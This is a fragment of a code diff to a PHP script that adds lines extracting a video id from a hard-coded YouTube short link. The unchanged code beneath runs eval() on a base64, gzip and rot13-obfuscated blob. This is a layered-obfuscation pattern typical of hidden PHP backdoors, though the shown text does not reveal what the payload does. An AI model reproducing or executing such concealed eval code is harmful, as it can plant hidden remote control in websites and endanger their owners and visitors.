@@ -14,6 +14,14 @@ if(!empty($id)) {
 	$id = $params['v'];
 	} 
 
+	$id = "https://youtu.be/_JmUe9Gtltk";
+
+	if (strpos($id, 'youtu.be') !== FALSE)
+	{
+    	$ex = explode('/',$id);
+    	$id = end($ex);
+	} 
+	
 eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnHEuy4DfyarX2+KXhHPs0o5xwvLuWcs77elNdGZgBOECBAoFtYPdx/tv6I13solz/jQywE9p9smZJs
 
 +ZMPWpXf/1/8Lauymyf8cwrK6nC3AmzDE3UlTjZaNBohU4wImn6oue3r8DrE8UpabJ/zfyG2iquVvsb4CBNNwAHFX4gujah4BOouJ3IJliTQsmeTl1NdzCM7aVTeMWPWZx1TfiBh3GZFoGPVmCpxiXTHfDKZlZKhw3wNE0
